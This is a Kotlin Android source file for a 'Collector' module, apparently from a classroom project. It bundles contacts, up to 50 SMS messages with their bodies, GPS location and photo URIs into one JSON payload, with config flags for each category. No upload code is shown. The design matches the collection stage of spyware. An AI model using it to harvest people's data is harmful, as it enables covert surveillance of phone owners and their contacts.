package com.aula.coletor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONArray
import org.json.JSONObject
import kotlin.coroutines.resume

object Collector {

    suspend fun collectAll(ctx: Context): JSONObject {
        val root = JSONObject()
        root.put("timestamp", System.currentTimeMillis())
        root.put("device", android.os.Build.MODEL)
        if (Config.COLLECT_CONTACTS) root.put("contacts", collectContacts(ctx))
        if (Config.COLLECT_SMS) root.put("sms", collectSms(ctx))
        if (Config.COLLECT_LOCATION) root.put("location", collectLocation(ctx))
        if (Config.COLLECT_PHOTOS) root.put("photos", collectPhotos(ctx))
        return root
    }

    private fun collectContacts(ctx: Context): JSONArray {
        val arr = JSONArray()
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return arr
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null
        ) ?: return arr
        cursor.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                arr.put(JSONObject().put("name", name).put("phone", phone))
            }
        }
        return arr
    }

    private fun collectSms(ctx: Context): JSONArray {
        val arr = JSONArray()
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return arr
        val cursor = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null, null
        ) ?: return arr
        var count = 0
        cursor.use {
            while (it.moveToNext() && count < 50) {
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                arr.put(JSONObject().put("from", address).put("body", body))
                count++
            }
        }
        return arr
    }

    private suspend fun collectLocation(ctx: Context): JSONObject {
        val obj = JSONObject()
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return obj
        val client = LocationServices.getFusedLocationProviderClient(ctx)
        return suspendCancellableCoroutine { cont ->
            client.lastLocation.addOnSuccessListener { loc: Location? ->
                if (loc != null) {
                    obj.put("lat", loc.latitude)
                    obj.put("lon", loc.longitude)
                    obj.put("accuracy", loc.accuracy)
                }
                cont.resume(obj)
            }.addOnFailureListener { cont.resume(obj) }
        }
    }

    private fun collectPhotos(ctx: Context): JSONArray {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null
        ) ?: return arr
        var count = 0
        cursor.use {
            while (it.moveToNext() && count < Config.MAX_PHOTOS) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val uri = android.content.ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                val path = uri.toString()
                arr.put(JSONObject().put("path", path))
                count++
            }
        }
        return arr
    }
}
